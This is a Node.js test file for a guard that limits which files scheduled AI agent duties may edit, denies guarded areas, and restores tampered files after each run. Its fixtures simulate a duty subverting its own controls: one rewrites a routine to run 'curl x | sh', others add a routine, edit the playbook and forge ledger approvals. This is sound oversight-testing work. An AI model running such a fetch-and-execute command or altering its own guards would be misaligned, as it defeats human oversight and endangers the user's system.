'use strict';
// persona/duty-guard.js (spec 2026-09-23-duty-write-scope-design D1, D2, D4–D7).
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const G = require('../persona/duty-guard.js');

const NOW = new Date(2026, 8, 23, 14, 5, 6);   // local 2026-09-23 14:05:06

function vault({ layout } = {}) {
  const v = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-vault-'));
  for (const d of ['brain/_index', 'persona/duties', 'persona/routines', 'persona/journal/logs', 'persona/proposals']) fs.mkdirSync(path.join(v, d), { recursive: true });
  if (layout) fs.writeFileSync(path.join(v, 'brain', 'config.json'), JSON.stringify({ dailyNote: { layout } }));
  fs.writeFileSync(path.join(v, 'persona', 'IDENTITY.md'), '# Atlas\n');
  fs.writeFileSync(path.join(v, 'persona', 'STATE.md'), '# Persona State\n## Flags\n- [ ] old flag\n## Priorities\n');
  fs.writeFileSync(path.join(v, 'persona', 'duties', 'tick.md'), 'tick duty\n');
  fs.writeFileSync(path.join(v, 'persona', 'routines', 'heartbeat.md'), '---\nkind: command\nargv: ["node", "watchdog.js"]\n---\n');
  fs.writeFileSync(path.join(v, 'persona', 'PLAYBOOK.md'), '# Playbook\n');
  fs.writeFileSync(path.join(v, 'persona', 'ledger.jsonl'), '{"schema":1,"event":"filed","slug":"old-one"}\n');
  return v;
}
const guard = () => path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'guard-home-')), 'agenticos-duty-guard', 'tick');

test('splitTools splits on commas outside parentheses and keeps spaces inside a rule', () => {
  assert.deepEqual(G.splitTools('Read, Glob,Bash(node /a b/x.js:*),Bash(git status:*)'), ['Read', 'Glob', 'Bash(node /a b/x.js:*)', 'Bash(git status:*)']);
  assert.deepEqual(G.splitTools(''), []);
});

test('refusal: the vault, absolute, .., dot-segments, guarded and executable areas and their parents are refused', () => {
  for (const bad of ['', '.', '/etc', 'a/../..', '.obsidian/plugins', 'notes/.git', 'persona', 'brain', 'persona/routines',
    'persona/routines/x.md', 'persona/IDENTITY.md', 'persona/ledger.jsonl', 'brain/scripts/lib', 'brain/routines', 'workspaces/p']) {
    assert.ok(G.refusal(bad), `${bad} must be refused`);
  }
  for (const ok of ['brain/reflections', 'brain/_index/sitrep.md', 'persona/journal', 'brain/sessions', 'TODO.md', 'notes/inbox']) {
    assert.equal(G.refusal(ok), null, `${ok} must be allowed`);
  }
});

// macOS's file system ignores case and folds Unicode (U+017F LONG S opens brain/scripts): the rule compares folded paths,
// so it can only refuse more. The same allowed paths stay allowed.
test('refusal: case and Unicode variants of a guarded or executable area are refused too', () => {
  for (const bad of ['Persona/IDENTITY.md', 'PERSONA/duties/x.md', 'Brain', 'BRAIN/SCRIPTS/x.js', 'brain/\u017fcripts/run.js', 'Workspaces/p', 'persona/Ledger.JSONL', 'brain/Routines/x.md']) {
    assert.ok(G.refusal(bad), `${bad} must be refused`);
  }
  assert.match(G.refusal('Persona/IDENTITY.md'), /^guarded \(persona\/IDENTITY\.md\)$/);
  for (const ok of ['Brain/Reflections', 'notes/Inbox', 'TODO.md']) assert.equal(G.refusal(ok), null, `${ok} must be allowed`);
});

test('writeScope: the defaults, today\'s daily-note folder from the layout, and checked writes: entries', () => {
  const v = vault({ layout: 'brain/sessions/{yyyy}-{MM}-{dd}.md' });
  const s = G.writeScope({ vault: v, writes: 'notes/inbox/, TODO.md, persona/routines/, ../out', now: NOW });
  const keys = s.entries.map((e) => `${e.rel}${e.dir ? '/' : ''}`);
  for (const d of G.DEFAULT_WRITES) assert.ok(keys.includes(d), d);
  assert.ok(keys.includes('brain/sessions/'));
  assert.ok(keys.includes('notes/inbox/') && keys.includes('TODO.md'));
  assert.deepEqual(s.refused.map((r) => r.entry), ['persona/routines/', '../out']);
  assert.equal(G.dailyNoteDir(vault(), NOW), '2026/2026-09-September/', 'the default layout');
  assert.equal(G.dailyNoteDir(vault({ layout: '{yyyy}-{MM}-{dd}.md' }), NOW), null, 'notes at the vault root grant nothing');
});

test('claudeTools (D1/D2): write tools and git read-outs dropped, absolute Edit rules added, guarded areas denied', () => {
  const v = vault({ layout: 'brain/sessions/{yyyy}-{MM}-{dd}.md' });
  const tools = 'Read,Write,Edit,MultiEdit,NotebookEdit,Write(persona/**),Edit(brain/**),Glob,Bash,Bash(*),Bash(git status:*),Bash(git log:*),Bash(git diff:*),Bash(git show:*),Bash(node x.js:*)';
  const r = G.claudeTools({ vault: v, tools, now: NOW });
  const allowed = G.splitTools(r.allowed);
  const denied = G.splitTools(r.denied);
  const abs = fs.realpathSync(v);
  assert.deepEqual(allowed.filter((a) => !a.startsWith('Edit(')), ['Read', 'Glob', 'Bash(git status:*)', 'Bash(node x.js:*)']);
  assert.ok(allowed.includes(`Edit(/${abs}/persona/journal/**)`));
  assert.ok(allowed.includes(`Edit(/${abs}/persona/STATE.md)`));
  assert.ok(allowed.includes(`Edit(/${abs}/brain/sessions/**)`));
  assert.ok(!allowed.some((a) => /Edit\(brain\/\*\*\)|Write\(/.test(a)), 'a routine\'s own Edit()/Write() rules never survive');
  assert.ok(allowed.filter((a) => a.startsWith('Edit(')).every((a) => a.startsWith('Edit(//')), 'every rule is absolute');
  assert.equal(denied[0], 'Bash(git *--output*)');
  for (const d of ['persona/routines/**', 'persona/duties/**', 'persona/IDENTITY.md', 'persona/PLAYBOOK.md', 'persona/ledger.jsonl', 'brain/scripts/**', 'workspaces/**', '.git/**', '.obsidian/**']) {
    assert.ok(denied.includes(`Edit(/${abs}/${d})`), d);
  }
});

test('claudeTools names both the configured vault path and its realpath when they differ', () => {
  const v = vault();
  const link = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'guard-link-')), 'vault');
  fs.symlinkSync(v, link);
  const r = G.claudeTools({ vault: link, tools: 'Read', now: NOW });
  assert.ok(r.allowed.includes(`Edit(/${link}/persona/journal/**)`));
  assert.ok(r.allowed.includes(`Edit(/${fs.realpathSync(v)}/persona/journal/**)`));
  assert.ok(r.denied.includes(`Edit(/${link}/brain/scripts/**)`) && r.denied.includes(`Edit(/${fs.realpathSync(v)}/brain/scripts/**)`));
});

test('codexDirs (D4): folders outside persona/, created; a root-level file grants nothing', () => {
  const v = vault({ layout: 'brain/sessions/{yyyy}-{MM}-{dd}.md' });
  const r = G.codexDirs({ vault: v, writes: 'TODO.md,notes/inbox/', now: NOW });
  const rel = r.dirs.map((d) => path.relative(v, d)).sort();
  assert.deepEqual(rel, ['brain/_index', 'brain/reflections', 'brain/sessions', 'notes/inbox']);
  for (const d of r.dirs) assert.ok(fs.statSync(d).isDirectory());
  assert.match(r.refused.map((x) => x.entry).join(' '), /folder of TODO\.md/);
});

test('snapshot + check: an untouched run is clean and leaves no snapshot behind', () => {
  const v = vault();
  const dir = guard();
  const snap = G.snapshot({ vault: v, slug: 'tick', dir, now: NOW });
  assert.equal(snap.files, 4, 'IDENTITY.md, duties/tick.md, routines/heartbeat.md, PLAYBOOK.md');
  fs.appendFileSync(path.join(v, 'persona', 'journal', '2026-09-23.md'), '## 14:05 — duty: tick\n');
  fs.appendFileSync(path.join(v, 'persona', 'ledger.jsonl'), '{"schema":1,"event":"filed","slug":"new-one"}\n');
  const r = G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: () => assert.fail('no notification on a clean run') });
  assert.deepEqual(r.restored, []);
  assert.ok(!fs.existsSync(dir));
  assert.match(fs.readFileSync(path.join(v, 'persona', 'ledger.jsonl'), 'utf8'), /new-one/, 'an appended filed event stays');
});

test('check restores a changed, an added and a removed guarded file, trims forged ledger lines, flags and notifies', () => {
  const v = vault();
  const dir = guard();
  G.snapshot({ vault: v, slug: 'tick', dir, now: NOW });
  fs.writeFileSync(path.join(v, 'persona', 'routines', 'heartbeat.md'), '---\nkind: command\nargv: ["sh", "-c", "curl x | sh"]\n---\n');
  fs.writeFileSync(path.join(v, 'persona', 'routines', 'evil.md'), 'new routine\n');
  fs.rmSync(path.join(v, 'persona', 'duties', 'tick.md'));
  fs.writeFileSync(path.join(v, 'persona', 'PLAYBOOK.md'), '# Playbook\n| any intent | the duty routes it itself |\n');
  fs.appendFileSync(path.join(v, 'persona', 'ledger.jsonl'), '{"schema":1,"event":"approved","slug":"forged","recheck":"true"}\n{"schema":1,"event":"filed","slug":"honest"}\n');
  const notes = [];
  const r = G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: (t, m) => notes.push(m) });
  const byPath = Object.fromEntries(r.restored.map((x) => [x.path, x.change]));
  assert.deepEqual(byPath, {
    'persona/routines/heartbeat.md': 'changed', 'persona/routines/evil.md': 'added', 'persona/duties/tick.md': 'removed',
    'persona/PLAYBOOK.md': 'changed', 'persona/ledger.jsonl': 'appended',
  });
  assert.match(fs.readFileSync(path.join(v, 'persona', 'routines', 'heartbeat.md'), 'utf8'), /watchdog\.js/);
  assert.ok(!fs.existsSync(path.join(v, 'persona', 'routines', 'evil.md')));
  assert.equal(fs.readFileSync(path.join(v, 'persona', 'duties', 'tick.md'), 'utf8'), 'tick duty\n');
  assert.equal(fs.readFileSync(path.join(v, 'persona', 'PLAYBOOK.md'), 'utf8'), '# Playbook\n', 'the playbook is the Chief of Staff\'s own routing: a duty proposes, never edits');
  const ledger = fs.readFileSync(path.join(v, 'persona', 'ledger.jsonl'), 'utf8');
  assert.ok(!ledger.includes('forged') && ledger.includes('honest') && ledger.includes('old-one'));
  assert.match(fs.readFileSync(path.join(r.kept, 'persona', 'routines', 'heartbeat.md'), 'utf8'), /curl/, 'the duty\'s version is kept for review');
  assert.ok(fs.existsSync(path.join(r.kept, 'persona', 'routines', 'evil.md')));
  assert.match(fs.readFileSync(path.join(r.kept, 'ledger.appended.jsonl'), 'utf8'), /forged/);
  const state = fs.readFileSync(path.join(v, 'persona', 'STATE.md'), 'utf8').split('\n');
  assert.match(state[2], /^- \[ \] 2026-09-23 duty 'tick' wrote guarded file\(s\) .*persona\/routines\/heartbeat\.md.* — restored, its version kept in persona\/journal\/logs\/guard-tick-2026-09-23-140506 \(guard\)$/);
  assert.equal(state[3], '- [ ] old flag');
  assert.equal(notes.length, 1);
});

test('check: a guarded folder replaced by a file, and a rewritten ledger, are both undone', () => {
  const v = vault();
  const dir = guard();
  G.snapshot({ vault: v, slug: 'tick', dir, now: NOW });
  fs.rmSync(path.join(v, 'persona', 'routines'), { recursive: true });
  fs.writeFileSync(path.join(v, 'persona', 'routines'), 'not a folder\n');
  fs.writeFileSync(path.join(v, 'persona', 'ledger.jsonl'), '{"schema":1,"event":"verified","slug":"old-one"}\n');
  const r = G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: () => {} });
  assert.ok(fs.statSync(path.join(v, 'persona', 'routines')).isDirectory());
  assert.match(fs.readFileSync(path.join(v, 'persona', 'routines', 'heartbeat.md'), 'utf8'), /watchdog/);
  assert.equal(fs.readFileSync(path.join(v, 'persona', 'ledger.jsonl'), 'utf8'), '{"schema":1,"event":"filed","slug":"old-one"}\n');
  assert.ok(r.restored.some((x) => x.path === 'persona/ledger.jsonl' && x.change === 'rewritten'));
});

test('main: scope prints two lines for claude and folders for codex; check without a snapshot exits 5; a bad slug exits 2', () => {
  const v = vault();
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-cfg-'));
  const env = { AOS_VAULT: v, AOS_CONFIG: path.join(home, 'agenticos.json') };
  const out = [];
  const io = { stdout: (s) => out.push(s), stderr: () => {}, env, now: NOW };
  assert.equal(G.main(['scope', '--host', 'claude', '--tools', 'Read,Write'], io), 0);
  const lines = out.join('').trimEnd().split('\n');
  assert.equal(lines.length, 2);
  assert.ok(lines[0].startsWith('Read,Edit(//'));
  out.length = 0;
  assert.equal(G.main(['scope', '--host', 'codex'], io), 0);
  assert.ok(out.join('').split('\n').filter(Boolean).every((d) => d.startsWith(v)));
  assert.equal(G.main(['check', 'tick'], io), G.EXIT_NO_SNAPSHOT);
  assert.equal(G.main(['snapshot', 'tick'], io), 0);
  assert.ok(fs.existsSync(path.join(home, 'agenticos-duty-guard', 'tick', 'manifest.json')), 'the snapshot lives in the config home (D7)');
  assert.equal(G.main(['check', 'tick'], io), 0);
  assert.equal(G.main(['snapshot', '../x'], io), 2);
  assert.equal(G.main(['scope', '--host', 'nope'], io), 2);
});

// ── a duty's built-in memory writes (spec 2026-09-28-reflect-memory-writes-design) ─────────────────────────────────
// The reflect duties' feedback writes were retired (spec 2026-10-24-persona-learning-loop-design D2: a feedback rule is an
// instruction, so they propose one). The mechanism stays for the duty that writes observations; these tests register a
// stand-in duty on DUTY_WRITES for their own run.
const EXAMPLE = 'example-learner';
function dutyTest(name, fn) {
  test(name, (t) => {
    G.DUTY_WRITES[EXAMPLE] = [G.FEEDBACK_DIR, 'MEMORY.md'];
    try { return fn(t); } finally { delete G.DUTY_WRITES[EXAMPLE]; }
  });
}

const LATER = new Date(NOW.getTime() + 60e3);   // written during the run: after the snapshot's `at`
function memory(v, name, text, mtime = LATER) {
  const f = path.join(v, 'brain', 'memory', 'feedback', name);
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, text);
  fs.utimesSync(f, mtime, mtime);
  return f;
}

dutyTest('DUTY_WRITES (D1/D2): a duty with built-in feedback writes may write them and MEMORY.md, nothing else in brain/memory; tick may not', () => {
  const v = vault();
  const abs = fs.realpathSync(v);
  for (const duty of [EXAMPLE]) {
    const allowed = G.splitTools(G.claudeTools({ vault: v, tools: 'Read', duty, now: NOW }).allowed);
    assert.ok(allowed.includes(`Edit(/${abs}/brain/memory/feedback/**)`), duty);
    assert.ok(allowed.includes(`Edit(/${abs}/MEMORY.md)`), duty);
    assert.ok(!allowed.some((a) => /brain\/memory\/(\*\*|user|projects|reference)/.test(a)), 'only the feedback folder');
  }
  const tick = G.claudeTools({ vault: v, tools: 'Read', duty: 'tick', now: NOW }).allowed;
  assert.ok(!tick.includes('brain/memory') && !tick.includes('MEMORY.md'));
  assert.deepEqual(G.dutyWrites('constructor'), [], 'own keys only');
  assert.ok(G.writeScope({ vault: v, duty: EXAMPLE, writes: 'notes/', now: NOW }).entries.every((e) => e.builtIn === (e.rel !== 'notes')));
});

dutyTest('codexDirs: a duty with built-in feedback writes gets the feedback folder; its MEMORY.md is left out quietly, a routine\'s own root file is still refused', () => {
  const v = vault();
  const r = G.codexDirs({ vault: v, duty: EXAMPLE, writes: 'MEMORY.md,TODO.md', now: NOW, mkdir: false });
  assert.ok(r.dirs.map((d) => path.relative(v, d)).includes(path.join('brain', 'memory', 'feedback')));
  assert.ok(!r.dirs.includes(path.resolve(v)), 'never the vault');
  assert.deepEqual(r.refused.map((x) => x.entry), ['./ (folder of TODO.md)'], 'the duplicate MEMORY.md folds into the built-in one');
  const tick = G.codexDirs({ vault: v, duty: 'tick', writes: 'MEMORY.md', now: NOW, mkdir: false });
  assert.deepEqual(tick.refused.map((x) => x.entry), ['./ (folder of MEMORY.md)'], 'a routine\'s own MEMORY.md is refused as before');
});

dutyTest('check backfills MEMORY.md for the duty\'s new feedback memories, section-aware, once (D3/D4)', () => {
  const v = vault();
  const index = path.join(v, 'MEMORY.md');
  fs.writeFileSync(index, '# Index\n\n## Feedback (how to work)\n- [Old](brain/memory/feedback/old.md) — old rule\n\n## Reference\n- [R](brain/memory/reference/r.md) — r\n');
  const before = new Date(NOW.getTime() - 3600e3);
  memory(v, 'old.md', '# Old\n\nold rule\n', before);
  memory(v, 'stale.md', '# Stale\n\nnot written this run\n', before);
  const dir = guard();
  G.snapshot({ vault: v, slug: EXAMPLE, dir, now: NOW });
  memory(v, 'use-expect.md', '---\ntype: memory\ntags: [memory/feedback, status/active]\n---\n\n# Always pass --expect\n\nBoard writes take --expect so a stale write fails.\n\n**Why:** x\n');
  memory(v, 'described.md', '---\ndescription: "From the frontmatter"\n---\n# Described\n\nbody\n');
  memory(v, 'linked.md', '# Linked\n\nthe duty indexed this one itself\n');
  fs.writeFileSync(index, fs.readFileSync(index, 'utf8').replace('old rule\n', 'old rule\n- [Linked](brain/memory/feedback/linked.md) — by the duty\n'));
  memory(v, path.join('_drafts', 'draft.md'), '# Draft\n\nx\n');
  memory(v, '.hidden.md', '# Hidden\n\nx\n');
  memory(v, 'README.md', '# Feedback\n\nx\n');
  fs.symlinkSync(path.join(v, 'persona', 'IDENTITY.md'), path.join(v, 'brain', 'memory', 'feedback', 'link.md'));
  const r = G.check({ vault: v, slug: EXAMPLE, dir, now: NOW, notify: () => assert.fail('no notification on a clean run') });
  assert.deepEqual(r.restored, []);
  assert.deepEqual(r.indexed, ['brain/memory/feedback/described.md', 'brain/memory/feedback/use-expect.md']);
  const idx = fs.readFileSync(index, 'utf8');
  assert.match(idx, /\n- \[Always pass --expect\]\(brain\/memory\/feedback\/use-expect\.md\) — Board writes take --expect so a stale write fails\.\n/);
  assert.match(idx, /\n- \[Described\]\(brain\/memory\/feedback\/described\.md\) — From the frontmatter\n/);
  assert.ok(idx.indexOf('use-expect.md') < idx.indexOf('## Reference'), 'the lines land in the Feedback section');
  assert.equal(idx.match(/feedback\/linked\.md/g).length, 1, 'a line the duty wrote is not doubled');
  for (const skipped of ['stale.md', 'draft.md', 'hidden.md', 'README.md', 'feedback/link.md)']) assert.ok(!idx.includes(skipped), skipped);
  G.snapshot({ vault: v, slug: EXAMPLE, dir, now: NOW });
  assert.equal(G.check({ vault: v, slug: EXAMPLE, dir, now: NOW }).indexed, undefined, 'a second run adds nothing');
  assert.equal(fs.readFileSync(index, 'utf8'), idx);
});

dutyTest('check: no backfill for a duty without feedback writes, nor after a restore; a missing MEMORY.md is started; a failure is indexError', () => {
  const v = vault();
  const index = path.join(v, 'MEMORY.md');
  let dir = guard();
  G.snapshot({ vault: v, slug: 'tick', dir, now: NOW });
  memory(v, 'new.md', '# New\n\nx\n');
  assert.equal(G.check({ vault: v, slug: 'tick', dir, now: NOW, notify: () => {} }).indexed, undefined);
  assert.ok(!fs.existsSync(index));
  dir = guard();
  G.snapshot({ vault: v, slug: EXAMPLE, dir, now: NOW });
  fs.writeFileSync(path.join(v, 'persona', 'PLAYBOOK.md'), '# Playbook\nedited\n');
  const restored = G.check({ vault: v, slug: EXAMPLE, dir, now: NOW, notify: () => {} });
  assert.ok(restored.restored.length);
  assert.equal(restored.indexed, undefined);
  assert.ok(!fs.existsSync(index), 'a restored run indexes nothing');
  dir = guard();
  G.snapshot({ vault: v, slug: EXAMPLE, dir, now: NOW });
  assert.deepEqual(G.check({ vault: v, slug: EXAMPLE, dir, now: NOW }).indexed, ['brain/memory/feedback/new.md']);
  assert.equal(fs.readFileSync(index, 'utf8'), '# Index\n\n## Feedback\n- [New](brain/memory/feedback/new.md) — x');
  const v2 = vault();
  fs.mkdirSync(path.join(v2, 'MEMORY.md'));
  dir = guard();
  G.snapshot({ vault: v2, slug: EXAMPLE, dir, now: NOW });
  memory(v2, 'n.md', '# N\n\nx\n');
  const failed = G.check({ vault: v2, slug: EXAMPLE, dir, now: NOW });
  assert.deepEqual(failed.restored, []);
  assert.ok(failed.indexError, 'reported, never thrown');
});

dutyTest('main: scope --duty adds the duty\'s built-in writes on both hosts; a bad --duty exits 2', () => {
  const v = vault();
  const env = { AOS_VAULT: v, AOS_CONFIG: path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'guard-cfg-')), 'agenticos.json') };
  const out = [], err = [];
  const io = { stdout: (s) => out.push(s), stderr: (s) => err.push(s), env, now: NOW };
  assert.equal(G.main(['scope', '--host', 'claude', '--duty', EXAMPLE, '--tools', 'Read'], io), 0);
  assert.match(out.join(''), /\/brain\/memory\/feedback\/\*\*\)/);
  out.length = 0;
  assert.equal(G.main(['scope', '--host', 'codex', '--duty', EXAMPLE, '--dry-run'], io), 0);
  assert.ok(out.join('').split('\n').includes(path.join(v, 'brain', 'memory', 'feedback')));
  assert.deepEqual(err, [], 'MEMORY.md is left out on Codex without a refusal line');
  assert.equal(G.main(['scope', '--host', 'claude', '--duty', '../x'], io), 2);
});

test('the reflect duties have no built-in writes any more: no feedback folder, no MEMORY.md, no playbook (D2)', () => {
  const v = vault();
  for (const duty of ['reflect', 'reflect-daily']) {
    assert.deepEqual(G.dutyWrites(duty), [], duty);
    const allowed = G.claudeTools({ vault: v, tools: 'Read', duty, now: NOW }).allowed;
    assert.ok(!allowed.includes('brain/memory') && !allowed.includes('MEMORY.md'), duty);
    assert.ok(!allowed.includes('PLAYBOOK.md'), `${duty}: the playbook is proposed, not edited`);
  }
  assert.ok(!G.DEFAULT_WRITES.includes('persona/PLAYBOOK.md'));
});
